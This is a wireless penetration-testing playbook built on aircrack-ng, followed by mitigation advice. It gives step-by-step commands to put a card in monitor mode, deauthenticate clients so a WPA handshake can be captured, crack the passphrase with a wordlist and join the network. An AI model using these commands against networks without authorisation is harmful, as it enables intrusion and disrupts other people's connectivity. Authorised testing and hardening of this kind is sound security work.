# Penetration Testing Playbook: Wireless Assessment (aircrack-ng)

## 1. Objective
To evaluate the security posture of a wireless network by capturing 802.11 frames, intercepting WPA/WPA2 handshakes, and attempting to recover the Pre-Shared Key (PSK) via cryptographic attacks.

---

## 2. PTES Phases & Execution

### Phase 1: Intelligence Gathering (Recon)
**Goal:** Identify target SSIDs, BSSIDs, and active clients.
*   **Tool:** `airmon-ng`, `airodump-ng`
*   **Commands:**
    ```bash
    # Start monitor mode
    sudo airmon-ng start wlan0
    
    # Scan for nearby networks and clients
    sudo airodump-ng wlan0mon
    ```
*   **Expected Findings:** Target BSSID (MAC), Operating Channel, Encryption Type (WPA2/WPA3), and connected Station MACs.

### Phase 2: Enumeration (Analysis)
**Goal:** Focus on a specific target to capture the 4-Way Handshake.
*   **Tool:** `airodump-ng`
*   **Commands:**
    ```bash
    # Target specific BSSID on a specific channel, saving data to a file
    sudo airodump-ng -c [channel] --bssid [BSSID] -w capture_file wlan0mon
    ```
*   **Expected Findings:** Verification of active clients connected to the target AP.

### Phase 3: Vulnerability Analysis (Attack Vector)
**Goal:** Force a reconnection to capture the EAPOL handshake.
*   **Tool:** `aireplay-ng`
*   **Commands:**
    ```bash
    # Deauthenticate a specific client to force a new handshake
    sudo aireplay-ng -0 5 -a [BSSID] -c [Client_MAC] wlan0mon
    ```
*   **Expected Findings:** `airodump-ng` output showing "WPA handshake: [BSSID]" in the top right corner.

### Phase 4: Exploitation (Cracking)
**Goal:** Recover the plaintext passphrase from the captured handshake.
*   **Tool:** `aircrack-ng`
*   **Commands:**
    ```bash
    # Wordlist attack against the capture file
    aircrack-ng -w /path/to/wordlist.txt capture_file-01.cap
    ```
*   **Expected Findings:** The plaintext WPA/WPA2 passphrase if it exists within the provided wordlist.

### Phase 5: Post-Exploitation & Reporting
**Goal:** Validate network access and document the weakness.
*   **Action:** Connect to the network using the recovered key; assess internal network visibility.
*   **Expected Findings:** Proof of Concept (PoC) showing unauthorized access to the internal LAN.

---

## 3. Summary Table

| Phase | Tool | Primary Command | Key Output |
| :--- | :--- | :--- | :--- |
| **Recon** | `airodump-ng` | `airodump-ng wlan0mon` | List of BSSIDs/Channels |
| **Enum** | `airodump-ng` | `airodump-ng -c [CH] --bssid [MAC] -w [FILE]` | Target Client MACs |
| **Vuln Scan** | `aireplay-ng` | `aireplay-ng -0 [COUNT] -a [BSSID] -c [MAC]` | Captured EAPOL Handshake |
| **Exploit** | `aircrack-ng` | `aircrack-ng -w [LIST] [FILE].cap` | Plaintext Password |

---

## 4. Mitigations
*   **Strong Passphrases:** Use high-entropy passwords (16+ characters, mixed case/symbols) to defeat dictionary attacks.
*   **WPA3 Transition:** Upgrade to **WPA3-SAE**, which utilizes simultaneous authentication of equals to prevent offline dictionary attacks.
*   **Enterprise Authentication:** Implement **WPA2/WPA3-Enterprise (802.1X)** using RADIUS servers for per-user authentication instead of a shared key.
*   **Client Management:** Disable "Auto-Connect" on devices to prevent them from connecting to rogue APs or being easily targeted by deauth frames.